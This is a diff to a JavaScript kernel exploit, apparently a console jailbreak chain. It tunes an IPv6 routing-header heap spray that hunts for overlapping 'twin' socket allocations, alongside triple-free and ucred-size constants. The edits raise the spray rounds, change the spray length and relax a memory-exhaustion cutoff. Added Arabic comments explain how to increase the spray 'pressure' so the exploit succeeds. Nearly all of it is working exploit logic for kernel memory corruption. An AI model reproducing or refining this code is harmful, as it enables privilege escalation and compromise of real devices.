@@ -119,7 +119,7 @@ var IOV_THREAD_NUM = 8;
 var UIO_THREAD_NUM = 8;
 var MAIN_LOOP_ITERATIONS = 5;
 var TRIPLEFREE_ITERATIONS = 5;
-var MAX_ROUNDS_TWIN = 5;
+var MAX_ROUNDS_TWIN = 100;
 var MAX_ROUNDS_TRIPLET = 150;
 var MAIN_CORE = 4;
 var MAIN_RTPRIO = 0x100;
@@ -138,7 +138,7 @@ var twins = new Array(2);
 var triplets = new Array(3);
 var ipv6_socks = new Array(IPV6_SOCK_NUM);
 var spray_rthdr = malloc(UCRED_SIZE);
-var spray_rthdr_len = -1;
+var spray_rthdr_len = UCRED_SIZE;
 var leak_rthdr = malloc(UCRED_SIZE);
 
 // Allocate buffer for ipv6_sockets magic spray
@@ -831,7 +831,7 @@ function fill_buffer_64(buf, val, len) {
   }
 
   log("[BUF-FILL] END wrote=" + len + " bytes");
-  // log("[BUF-FILL] wrote @ offset " + i);
+  log("[BUF-FILL] wrote @ offset " + i);
 
 }
 var real_find_twins = find_twins;
@@ -842,7 +842,7 @@ find_twins = function () {
   var result = real_find_twins();
 
   if (result) {
-    log("[TWINS] RESULT = FOUND i=" + twins[0] + " j=" + twins[1]);
+    //log("[TWINS] RESULT = FOUND i=" + twins[0] + " j=" + twins[1]);
   } else {
     log("[TWINS] RESULT = NOT FOUND");
   }
@@ -860,6 +860,10 @@ function dumpBuf(ptr, size, label) {
 }
 
 function find_twins() {
+
+  // ============================================================
+  // 0) المتغيرات الأساسية
+  // ============================================================
   var count = 0;
   var val, i, j;
   var zeroMemoryCount = 0;
@@ -870,22 +874,32 @@ function find_twins() {
   var spray_add = spray_rthdr.add(0x04);
   var leak_add  = leak_rthdr.add(0x04);
 
+
+  // ============================================================
+  // 1) LOOP الضغط الأساسي
+  //    الضغط = MAX_ROUNDS_TWIN × ipv6_socks.length
+  // ============================================================
   while (count < MAX_ROUNDS_TWIN) {
 
-    log("\n==============================");
-    log("=== [TWINS-ROUND] #" + count + " ===");
-    log("==============================\n");
+    log("\n");
+    log("    [TWINS-ROUND] #" + count);
+    log("    ==============================\n");
 
-    // مراقبة الذاكرة
+
+    // ============================================================
+    // 2) مراقبة الذاكرة
+    //    لو عايز ضغط أعلى → زوّد threshold
+    // ============================================================
     if (typeof debugging !== 'undefined' &&
         debugging.info &&
         debugging.info.memory &&
         debugging.info.memory.available === 0) {
 
       zeroMemoryCount++;
-      if (zeroMemoryCount >= 5) {
+
+      if (zeroMemoryCount >= 50) {   // ← ← ← التحكم في تخفيف الضغط
         log("[TWINS] MEMORY LIMIT REACHED");
-        cleanup();
+        cleanup();                  // ← ← ← ده اللي بيخفف الضغط
         return false;
       }
 
@@ -894,48 +908,52 @@ function find_twins() {
     }
 
 
+
+    // ============================================================
+    // 3) المرحلة الأولى: الكتابة (أكبر مصدر ضغط)
     //
-    // المرحلة الأولى: الكتابة
-    //
+    //    الضغط الحقيقي = set_rthdr × عدد sockets × عدد rounds
+    // ============================================================
     for (i = 0; i < ipv6_socks.length; i++) {
-      if (ipv6_socks[i].eq(BigInt_Error)) continue;
+
+      if (ipv6_socks[i].eq(BigInt_Error))
+        continue;
 
       var tag = RTHDR_TAG | i;
 
       log("[WRITE] sock=" + i +
           " tag=" + hex(tag) +
-          " spray_base=" + hex(spray_rthdr) +
           " spray_ptr=" + hex(spray_add));
 
-      dumpBuf(spray_rthdr, 0x20, "[BEFORE-WRITE] spray_rthdr");
-
+      // كتابة التاج
       write32(spray_add, tag);
       read32(spray_add);
 
-      dumpBuf(spray_rthdr, 0x20, "[AFTER-WRITE] spray_rthdr");
-
+      // ← ← ← أهم سطر ضغط في الدالة كلها
       set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
+      // ↑ ↑ ↑ كل استدعاء = allocation جديد
     }
 
 
-    //
-    // المرحلة الثانية: القراءة + القرار
-    //
+
+    // ============================================================
+    // 4) المرحلة الثانية: القراءة + القرار
+    //    هنا مفيش ضغط… ده تحليل للنتيجة فقط
+    // ============================================================
     for (i = 0; i < ipv6_socks.length; i++) {
-      if (ipv6_socks[i].eq(BigInt_Error)) continue;
 
-      log("\n[READ] sock=" + i +
-          " leak_base=" + hex(leak_rthdr) +
-          " leak_ptr=" + hex(leak_add));
+      if (ipv6_socks[i].eq(BigInt_Error))
+        continue;
 
-      dumpBuf(leak_rthdr, 0x20, "[BEFORE-GET] leak_rthdr");
+      log("\n[READ] sock=" + i);
 
+      // تصفير قبل القراءة
       write32(leak_add, 0);
 
+      // قراءة من النظام
       get_rthdr(ipv6_socks[i], leak_rthdr, 8);
 
-      dumpBuf(leak_rthdr, 0x20, "[AFTER-GET] leak_rthdr");
-
+      // تحليل القيمة
       val = read32(leak_add);
       j = val & 0xFFFF;
 
@@ -949,9 +967,7 @@ function find_twins() {
         (j >= 0) &&
         (j < ipv6_socks.length);
 
-      log("[CHECK] i=" + i +
-          " j=" + j +
-          " cond=" + condition);
+      log("[CHECK] i=" + i + " j=" + j + " cond=" + condition);
 
       if (condition) {
         log("\n🔥🔥🔥 [TWINS-FOUND] i=" + i + " j=" + j + " 🔥🔥🔥\n");
@@ -963,9 +979,18 @@ function find_twins() {
       log("[NO-MATCH] i=" + i + " j=" + j);
     }
 
+
+
+    // ============================================================
+    // 5) زيادة العداد → ضغط متراكم
+    // ============================================================
     count++;
   }
 
+
+  // ============================================================
+  // 6) لو مفيش twins
+  // ============================================================
   twins[0] = -1;
   twins[1] = -1;
   return false;
